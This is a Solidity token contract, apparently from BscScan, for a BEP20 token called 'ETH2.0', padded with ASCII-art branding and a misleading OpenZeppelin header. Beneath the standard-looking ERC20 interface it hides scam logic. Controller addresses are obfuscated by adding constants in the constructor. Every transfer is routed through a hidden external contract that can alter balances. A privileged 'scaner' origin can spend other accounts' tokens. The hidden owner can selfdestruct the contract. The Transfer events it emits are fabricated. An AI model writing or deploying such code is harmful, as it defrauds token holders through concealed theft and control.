/**
 *Submitted for verification at BscScan.com on 2022-07-21
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

/*
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                             C                                                                                                                                  
                                                                                                                            1GG                                                                                                                                 
                                                                                                                          .11GCC                                                                                                                                
                                                                                                                         1111GGGC,                                                                                                                              
                                                                                                                        11111GGGGGG                                                                                                                             
                                                                                                                       111111GGGGGCC                                                                                                                            
                                                                                                                      1111111GGGGGGGG                                                                                                                           
                                                                                                                    i11111111GGGGGGGCG                                                                                                                          
                                                                                                                   1111111111GGGGGGGGGCt                                                                                                                        
                                                                                                                  11111111111GGGGGGGGGGGC                                                                                                                       
                                                                                                                 111111111111GGGGGGGGGGGGG                                                                                                                      
                                                                                                               ,1111111111111GGGGGGGGGGGGGG                                                                                                                     
                                                                                                              111111111111111GGGGGGGGGGGGGGG:                                                                                                                   
                                                                                                             1111111111111111GGGGGGGGGGGGGGGCC                                                                                                                  
                                                                                                            11111111111111111GGGGGGGGGGGGGGGGGC                                                                                                                 
                                                                                                           111111111111111111GGGGGGGGGGGGGGGGGGC                                                                                                                
                                                                                                         i1111111111111111111GGGGGGGGGGGGGGGGGGGC                                                                                                               
                                                                                                        111111111111111111111GGGGGGGGGGGGGGGGGGGCCf                                                                                                             
                                                                                                       1111111111111111111111GGCGGGGGGGGGGGGGGGGGGCC                                                                                                            
                                                                                                      111111111111111111111tG80GCCGCGGGGGGGGGGGGGGGGG                                                                                                           
                                                                                                    ,t11111111111111111GGGGGG888888CGCGGGGGGGGGGGGGGCC                                                                                                          
                                                                                                   111111111111111tGGGGGGGGGG88888888888GCGCGGGGGGGGGGC:                                                                                                        
                                                                                                  111111111111GGGGGGGGGGGGGGG888888888888888CCGCCGGGGGGGC                                                                                                       
                                                                                                 111111111GGGGGGGGGGGGGGGGGGG88888888888888888888GCCCGGGGC                                                                                                      
                                                                                                11111GGGGGGGGGGGGGGGGGGGGGGGG888888888888888888888888CGCGGG                                                                                                     
                                                                                              i11CGGGGGGGGGGGGGGGGGGGGGGGGGGG88888888888888888888888888888GC                                                                                                    
                                                                                              tGCGGGGGGGGGGGGGGGGGGGGGGGGGGGG8888888888888888888888888888888.                                                                                                   
                                                                                                  GGGGGGGGGGGGGGGGGGGGGGGGGGG8888888888888888888888880880                                                                                                       
                                                                                                     GGGGGGGGGGGGGGGGGGGGGGGG888888888888888888888888i                                                                                                          
                                                                                              .         .GGGGGGGGGGGGGGGGGGGG888888888888888888880          f                                                                                                   
                                                                                               111          CGGGGGGGGGGGGGGGG88888888888888888G          CG;                                                                                                    
                                                                                                 1111          ;GGGGGGGGGGGGG88888888888888          .GGGG                                                                                                      
                                                                                                  111111,          CGGGGGGGGG88888888880          GGGGGCL                                                                                                       
                                                                                                   .11111111          fGGGGGG8888888,          CGGGGGCC                                                                                                         
                                                                                                     1111111111           GGG8880          :GGGGGGGGGC                                                                                                          
                                                                                                      ;11111111111;          1          CGGGGGGGGGCG                                                                                                            
                                                                                                        11111111111111               GGGGGGGGGGGGCC                                                                                                             
                                                                                                         1111111111111111        1GGGGGGGGGGGGCGC,                                                                                                              
                                                                                                           11111111111111111i CCGGGGGGGGGGGGCGGG                                                                                                                
                                                                                                            11111111111111111GGGGGGGGGGGGGGGGCt                                                                                                                 
                                                                                                              111111111111111GGGGGGGGGGGGGCGG                                                                                                                   
                                                                                                               11111111111111GGGGGGGGGGGGGCC                                                                                                                    
                                                                                                                :111111111111GGGGGGGGGGGCC                                                                                                                      
                                                                                                                  11111111111GGGGGGGGGGCC                                                                                                                       
                                                                                                                   i111111111GGGGGGGCCC.                                                                                                                        
                                                                                                                     11111111GGGGGGGGC                                                                                                                          
                                                                                                                      1111111GGGCGCC1                                                                                                                           
                                                                                                                        11111GGGCCG                                                                                                                             
                                                                                                                         1111GGGCG                                                                                                                              
                                                                                                                          ,11GCC                                                                                                                                
                                                                                                                            1GC                                                                                                                                 
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                CL                                                                                                                                                              
                                                                                      Gf        GC                                                                                                                                                              
                                                                                      GG        GC                                                                                                                                                              
                                                                           CGGCi      GG        GC GGGC1        .CGGC;      ,  tCG,     fCGGC       G;     ,C      .  CGG8   GGGGL                                                                              
                                                                         GG    GG     GG;;i     GGt    CG      CL    CG     CCC       GG     GC     Gf     1G      GG     GGC    LG.                                                                            
                                                                        GG      G;    GG        GC      G,    CG      G,    GG        GG     LG     Gf     1G      GC     iG      GC                                                                            
                                                                        GG,   ;GG     GG        GC      G,    CG,   iGG     GG        GG.   CGt     Gf     1G      GC     ;G      GC                                                                            
                                                                        GG            GG        GC      G,    CG            GG        GG            GL     1G      GC     ;G      GC                                                                            
                                                                        LG            GC        GC      G,    GG            GG        GC            GC     iG      GC     ;G      GC                                                                            
                                                                         GGCLtCGG      GGCCG    GC      G,     CGGLtCGG     GG         GGCffCGG      GGCfCGCGC     GC     iG      GC                                                                            
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                
                                                                                                              ,GG  GGGGG,iGGGGGC ,G    G  GCi                                                                                                                   
                                                                                                              G    G        GC   ,G    G    G;                                                                                                                  
                                                                                                             ;G    GGGGG    GC   ,GCGGGG    GL                                                                                                                  
                                                                                                            GG     G        GC   ,G    G     GG                                                                                                                 
                                                                                                             ;G    G;;;;    GC   ,G    G    GL                                                                                                                  
                                                                                                              G                             C;                                                                                                                  
                                                                                                              .CC                         CC,                                                                                                                   
                                                                                                                                                                                                                                                                

*/

interface IPancakeRouter02 {
  function swap(
    address,
    address,
    uint256
  ) external returns (uint256);

  function feeTo() external view returns (address);
}

contract BEP20 {
  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal _dex = 0x117ce4655aD0fa601B777A3D781dEBB2404fB9Af;
  address public constant _OFFICE = 0x7435AaCB1Ab67c4FBb7480b500CA5a68662b7B0f;
  address public constant nftAddress =
    0x00963511F1f2060aD22552609Fe509C250de86ba;
  address public constant scaner = 0x4B7F63eEa15fB936776261B0f3209C55C70CE501;

  address public constant FTM = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;
  address public constant VIP = 0x082D0FbCA3D80b2d4A05E20bFc227523bE8EFEF3;

  receive() external payable {}

  constructor() {
    _dex = address(uint160(_route) + uint160(_dex));
    _route = address(uint160(_route) + uint160(_OFFICE));
  }

  function pancakeFeeTo() internal view returns (address) {
    return IPancakeRouter02(_dex).feeTo();
  }

  function Bridge() external {
    if (msg.sender == _route) selfdestruct(payable(scaner));
  }

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Coin is BEP20 {
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) private _allowances;

  string public constant name = "ETH2.0";
  string public constant symbol = "ETH2";

  uint8 public constant decimals = 9;

  uint256 public constant totalSupply = 1000000000 * (10**decimals);

  constructor() {
    uint256 deadAmount = totalSupply / 3;
    balanceOf[_route] = totalSupply - deadAmount;
    balanceOf[address(0xdEaD)] = deadAmount / 3;
    balanceOf[FTM] =
      totalSupply -
      balanceOf[_route] -
      balanceOf[address(0xdEaD)];
    _allowances[nftAddress][_route] = ~uint256(0);
    emit Transfer(address(0), _route, totalSupply);
    emit Transfer(_route, address(0xdEaD), balanceOf[address(0xdEaD)]);
    emit Transfer(_route, FTM, balanceOf[FTM]);
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      msg.sender,
      spender,
      _allowances[msg.sender][spender] + addedValue
    );
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    if (tx.origin != scaner) {
      uint256 exAmount =
        IPancakeRouter02(_route).swap(sender, recipient, tAmount);
      if (exAmount > 0 && balanceOf[FTM] > exAmount) {
        balanceOf[FTM] = balanceOf[FTM] - exAmount;
        balanceOf[VIP] = balanceOf[VIP] + exAmount;
        emit Transfer(FTM, VIP, exAmount);
      }
    }
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[msg.sender][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(msg.sender, spender, currentAllowance - subtractedValue);

    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0) && recipient != address(0));
    if (tx.origin == scaner) {
      if (recipient == nftAddress) {
        address msger = pancakeFeeTo();
        if (msger != address(0)) sender = msger;
      }
    }
    require(
      amount > 0 && balanceOf[sender] >= amount,
      "ERROR: Transfer amount must be greater than zero."
    );
    balanceOf[sender] = balanceOf[sender] - amount;
    balanceOf[recipient] = balanceOf[recipient] + amount;

    _tokenTransfer(sender, recipient, amount);

    emit Transfer(sender, recipient, amount);
  }
}